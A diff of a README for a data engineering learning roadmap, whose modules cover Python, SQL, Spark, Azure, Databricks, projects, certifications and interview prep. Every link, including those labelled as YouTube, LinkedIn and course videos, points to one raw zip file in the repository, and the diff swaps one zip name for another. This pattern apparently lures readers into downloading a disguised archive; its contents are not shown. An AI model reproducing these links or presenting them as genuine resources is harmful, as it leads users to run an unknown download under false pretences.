@@ -25,108 +25,108 @@ I want YOUR SUPPORT to make this REPOSITORY available to every single person who
 ## Module 1: Non-Negotiables of Data Engineering
 
 - **Python Programming Language**
-  - [Python For Data Engineering](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Python For Data Engineering](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **SQL - Structured Query Language**
-  - [SQL Full Course For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [SQL Full Course For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 2: Data Engineering Building Blocks
 
 - **Data Engineering Fundamentals**
-  - [Fundamentals of Data Engineering](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Fundamentals of Data Engineering](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Data Warehousing**
-  - [Data Warehouse - The Ulitmate Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Data Warehouse - The Ulitmate Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Data Modeling**
   This video will overlap with some concepts from `Data Warehousing` capter. But, I will still recommend to watch this video for better understanding of DATA MODELING.
-  - [Data Modeling for Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Data Modeling for Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 3: Master Big Data With Apache Spark
 
 - **Apache Spark For Big Data**
-  - [Apache Spark - The Ultimate Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Apache Spark - The Ultimate Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **PySpark Full Course - The Coding Paradigm**
-  - [PySpark Zero To Hero](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [PySpark Zero To Hero](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **PySpark Real-Time Scenarios**
-  - [PySpark Scenarios For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [PySpark Scenarios For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 4: Git and GitHub - Bread and Butter for Data Engineers
 
 - **Git and GitHub Full Course**
-  - [Complete Git and GitHub Tutorial for Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Complete Git and GitHub Tutorial for Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 5: Azure Data Engineering Tech Stack
 
 - **Fundamentals Azure Data Services**
-  - [Azure Data Fundamentals](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Azure Data Fundamentals](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Azure Data Factory**
-  - [Azure Data Factory For Beginners](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Azure Data Factory Advanced Course](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Azure Data Factory For Beginners](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Azure Data Factory Advanced Course](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Azure Synapse Analytics**
-  - [Azure Synapse Analytics - The Complete Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Azure Synapse Analytics - The Complete Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 6: Databricks Tech Stack - The Most Demanded Skill right now for Data Engineers
 
 - **Databricks - The Complete Guide**
-  - [Delta Lake - The Non Negotiable for Databricks Stack](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks Fundamentals For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks Modern Architecture With Unity Catalog](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks Lakeflow Declarative Pipelines - Delta Live Tables](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks Lakeflow Jobs and Workflows](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks SQL Warehouse - Full Course](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks Asset Bundles and CICD](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Delta Lake - The Non Negotiable for Databricks Stack](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks Fundamentals For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks Modern Architecture With Unity Catalog](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks Lakeflow Declarative Pipelines - Delta Live Tables](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks Lakeflow Jobs and Workflows](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks SQL Warehouse - Full Course](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks Asset Bundles and CICD](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 7: Microsoft Fabric Tech Stack- The New Player in Data Engineering World
 - **Microsoft Fabric - The Complete Guide**
-  - [Microsoft Fabric Full Course For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Microsoft Fabric Full Course For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 8: Trending Open Source Technologies for Data Engineering
 
 - **DBT - Data Build Tool**
-  - [DBT Masterclass](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [DBT Masterclass](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Spark Structured Streaming - Real-Time Data Processing**
-  - [Spark Structured Streaming - The Complete Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Spark Structured Streaming - The Complete Guide](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 ## Module 9: End to End Data Engineering Projects [Key to the door of your DREAM JOB]
 This section is the HEART of this ROADMAP. Here, you will learn how to build COMPLETE DATA ENGINEERING PROJECTS from SCRATCH to DEPLOYMENT using the CONCEPTS and TECHNOLOGIES you have learned so far. There is NO ORDER to watch these videos. You can pick any project based on your INTEREST and TECHNOLOGY PREFERENCE. But yes, try to watch ALL of them bcz each PROJECT is UNIQUE and solving the REAL-WORLD PROBLEMS.
 
 
-  - [Spotify Azure Data Engineering End-to-End Project [With CI/CD]](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Spotify Azure Data Engineering End-to-End Project [With CI/CD]](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [Azure Databricks End-To-End Project From SCRATCH!](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Azure Databricks End-To-End Project From SCRATCH!](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [DBT X Databricks Project For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [DBT X Databricks Project For Data Engineers](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [[WITH Azure DevOps] Azure Data Engineering End-to-End Project](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [[WITH Azure DevOps] Azure Data Engineering End-to-End Project](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [Netflix Data Engineering Project With Azure Data Factory and Databricks](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Netflix Data Engineering Project With Azure Data Factory and Databricks](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [PySpark X DBT Big Data Engineering Project](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [PySpark X DBT Big Data Engineering Project](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [Azure Data Factory End To End Project - OnPrem To Cloud Data Migration](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Azure Data Factory End To End Project - OnPrem To Cloud Data Migration](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [My First Azure Data Engineering Project - End to End](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [My First Azure Data Engineering Project - End to End](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Module 10 : Certifications and UDEMY Courses to Boost Your Resume
 This section contains the MOST RECOMMENDED CERTIFICATIONS and UDEMY COURSES for DATA ENGINEERS that will BOOST your RESUME and help you LAND your DREAM JOB because TRUST ME, RECRUITERS and HIRING MANAGERS LOVE to see CERTIFICATIONS on RESUMES.
 
-  - [Databricks Certified Data Engineer Associate Bootcamp](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Databricks Certified Data Engineer Associate Bootcamp](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
-  - [Microsoft DP-700 Fabric Data Engineer Exam Prep](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Microsoft DP-700 Fabric Data Engineer Exam Prep](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 The BEST part about these courses are that they are available on UDEMY at the price of a COFFEE [Choice is yours a COFFEE or a CERTIFICATION that will BOOST your CAREER]. Also, these courses cover much more TOPICS than the EXAM SYLLABUS, so you will be LEARNING a LOT MORE than just preparing for the EXAM.
 
@@ -136,17 +136,17 @@ This section is the WARM-UP before you step into the BATTLEFIELD of DATA ENGINEE
 You can pick any CHAPTERS[Videos] of your CHOICE based on your INTERVIEW PREPARATION [Tech Stack] NEEDS.
 
 - **Azure Tech Stack**
-  - [Azure Data Factory Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Azure Data Factory Real-Time Scenarios](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Azure Data Engineer Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Azure Data Factory Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Azure Data Factory Real-Time Scenarios](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Azure Data Engineer Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Databricks Tech Stack**
-  - [Databricks Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [Databricks Real-Time Scenarios](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [Databricks Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [Databricks Real-Time Scenarios](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 - **Apache Spark Stack**
-  - [PySpark Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-  - [PySpark Real-Time Scenarios](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+  - [PySpark Interview Questions](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+  - [PySpark Real-Time Scenarios](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ## Very Important Tips to Make the Most Out of This Roadmap
@@ -161,11 +161,11 @@ I know that EACH learner has different skills and background. So, you can always
 
 **Let's CONNECT!**
 
-- [YOUTUBE](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-- [UDEMY](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-- [LINKEDIN](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-- [TELEGRAM](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
-- [TWITTER](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Engineer_Roadmap_Data_2.8-alpha.5.zip)
+- [YOUTUBE](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+- [UDEMY](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+- [LINKEDIN](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+- [TELEGRAM](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
+- [TWITTER](https://raw.githubusercontent.com/iqbaldiit/Data_Engineer_Roadmap/main/raun/Data-Roadmap-Engineer-v3.9.zip)
 
 
 ---
